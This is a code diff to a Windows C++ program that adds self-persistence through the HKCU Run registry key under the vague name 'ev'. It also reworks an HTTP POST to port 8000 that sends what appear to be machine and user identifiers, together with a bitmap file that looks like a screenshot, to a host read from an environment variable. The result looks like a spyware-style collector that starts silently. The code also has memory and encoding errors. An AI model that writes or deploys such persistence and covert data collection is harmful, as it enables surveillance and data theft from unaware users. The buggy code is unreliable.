@@ -7,6 +7,7 @@
 #include "utils.hpp"
 
 #include <string>
+#include <algorithm>
 #include <iostream>
 
 #pragma comment(lib, "rpcrt4.lib")  // UuidCreate - Minimum supported OS Win 2000
@@ -30,20 +31,54 @@ constexpr auto DELTA_SEC = static_cast<DWORD>(3);
 // Пока на правах костыля
 const WCHAR* SAVE_BITMAP_TO = L"PATH_TO_FILE";
 
+void AutoRun()
+{
+    WCHAR arr[MAX_PATH] = {};
+
+    // https://learn.microsoft.com/ru-ru/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulefilenamea
+    const auto res = GetModuleFileName(NULL, (LPWSTR)arr, MAX_PATH);
+
+    // У winapi тут бага знатная. res никоим образом(почему-то вопреки докам) не характеризует состояние выполнения вызова
+    if ((GetLastError() == ERROR_SUCCESS)) {
+        HKEY hKey;
+
+        if (RegCreateKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS)
+        {
+            if (RegSetValueEx(hKey, L"ev", NULL, REG_SZ, (LPBYTE)arr, sizeof(arr)) == ERROR_SUCCESS)
+            {
+                RegCloseKey(hKey);
+            }
+            else {
+                wprintf(L"Error autorun!\n");
+                exit(5);
+            }
+            return;
+        }
+    }
+    else {
+        wprintf(L"Not found module! Error code: %d / %d\n", res, GetLastError());
+        exit(8);
+    }
+
+    free(arr);
+}
+
 int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
     _In_opt_ HINSTANCE hPrevInstance,
     _In_ LPWSTR    lpCmdLine,
     _In_ int       nCmdShow)
 {
+    AutoRun();
+
     auto buff = new WCHAR[buff_size];
 
     const auto var_size = GetEnvironmentVariable(HOST_ENV_VAR_NAME, buff, buff_size);
 
     if (var_size == 0) {
+        wprintf(L"var size was 0 for %s\n", HOST_ENV_VAR_NAME);
         return 1;
     }
     else if (var_size > buff_size) {
-
         // OK, so 50 isn't big enough.
         if (buff) {
             delete[] buff;
@@ -79,16 +114,22 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
             WINHTTP_NO_PROXY_NAME,
             WINHTTP_NO_PROXY_BYPASS, 0);
 
-        if (hSession)
-            hConnect = WinHttpConnect(hSession, buff,
-                INTERNET_DEFAULT_HTTP_PORT, 0);
+        if (hSession) {
+            hConnect = WinHttpConnect(hSession, buff, 8000, 0);
+        }
+        else {
+            wprintf(L"Could not get session!\n");
+        }
 
-        if (hConnect)
+        if (hConnect) {
             hRequest = WinHttpOpenRequest(hConnect, L"POST",
                 L"/ua",
                 NULL, WINHTTP_NO_REFERER,
                 WINHTTP_DEFAULT_ACCEPT_TYPES,
                 0);
+        } else {
+            wprintf(L"Could not connect to %s!\n", buff);
+        }
 
         BOOL bResults = FALSE;
 
@@ -96,24 +137,31 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
 
         auto bitmapAsStr = ReadBitmap(SAVE_BITMAP_TO);
 
-        auto data = d + L"\n" + c + L"\n" + u + L"\n" + bitmapAsStr;
+        auto data = d + L"\n" + c + L"\n" + u + L"\n";
+
+        char* body = new char[data.size() + bitmapAsStr.size() + 1];
+
+        std::copy(data.begin(), data.end(), body);
+        std::copy(bitmapAsStr.begin(), bitmapAsStr.end(), body + data.size());
+        body[data.size() + bitmapAsStr.size()] = '\0';
 
         wprintf(L"Sending %s %s %s\n", d.c_str(), c.c_str(), u.c_str());
 
         if (hRequest) {
-            WinHttpAddRequestHeaders(hRequest, L"Content-Type: text/plain", -1L, WINHTTP_ADDREQ_FLAG_ADD);
+            WinHttpAddRequestHeaders(hRequest, L"Content-Type: application/octet-stream", -1L, WINHTTP_ADDREQ_FLAG_ADD);
             wprintf(L"Got hRequest\n");
             bResults = WinHttpSendRequest(hRequest,
                 WINHTTP_NO_ADDITIONAL_HEADERS,
-                0, (LPVOID*)(data.c_str()), data.size(),
-                data.size(), 0);
+                0, (LPVOID*)(body), data.size() + bitmapAsStr.size() + 1,
+                data.size() + bitmapAsStr.size() + 1, 0);
         }
         else {
             wprintf(L"Could not get hRequest\n");
         }
 
-        if (!bResults)
-            wprintf(L"Error %d has occurred.\n", GetLastError());
+        delete[] body;
+
+        wprintf(L"Error %d has occurred.\n", GetLastError());
 
         // Close open handles.
         if (hRequest) WinHttpCloseHandle(hRequest);
